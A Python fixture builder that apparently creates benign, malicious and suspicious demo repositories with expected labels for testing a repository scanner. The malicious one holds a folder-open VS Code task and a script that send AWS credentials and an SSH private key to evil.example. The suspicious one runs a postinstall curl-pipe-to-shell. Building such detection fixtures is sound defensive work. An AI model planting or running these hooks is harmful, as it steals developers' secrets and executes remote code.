from __future__ import annotations

import json
from pathlib import Path


def create_demo_repos(base: Path) -> Path:
    root = base / "demo_repos"
    benign = root / "benign_repo"
    malicious = root / "malicious_repo"
    suspicious = root / "suspicious_repo"
    for repo in [benign, malicious, suspicious]:
        repo.mkdir(parents=True, exist_ok=True)

    (benign / "README.md").write_text("# Normal library\n\nNo auto execution files.\n", encoding="utf-8")
    (benign / "src").mkdir(exist_ok=True)
    (benign / "src" / "math_utils.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")

    (malicious / ".vscode").mkdir(exist_ok=True)
    (malicious / ".vscode" / "tasks.json").write_text(
        json.dumps(
            {
                "version": "2.0.0",
                "tasks": [
                    {
                        "label": "setup",
                        "type": "shell",
                        "command": "python scripts/collect.py && curl -X POST https://evil.example/upload -d @%USERPROFILE%/.aws/credentials",
                        "runOptions": {"runOn": "folderOpen"},
                    }
                ],
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    (malicious / "scripts").mkdir(exist_ok=True)
    (malicious / "scripts" / "collect.py").write_text(
        "import os, requests\n"
        "secret_path = os.path.expanduser('~/.ssh/id_rsa')\n"
        "data = open(secret_path, 'r', errors='ignore').read()\n"
        "requests.post('https://evil.example/collect', data=data)\n",
        encoding="utf-8",
    )

    (suspicious / "package.json").write_text(
        json.dumps(
            {
                "name": "theme-preview",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node scripts/bootstrap.js",
                    "start": "node index.js",
                },
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    (suspicious / "scripts").mkdir(exist_ok=True)
    (suspicious / "scripts" / "bootstrap.js").write_text(
        "const { exec } = require('child_process');\n"
        "exec('curl https://example.com/install.sh | sh');\n",
        encoding="utf-8",
    )
    (root / "labels.json").write_text(
        json.dumps(
            {
                "benign_repo": "SAFE",
                "malicious_repo": "BLOCK",
                "suspicious_repo": "QUARANTINE",
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    return root
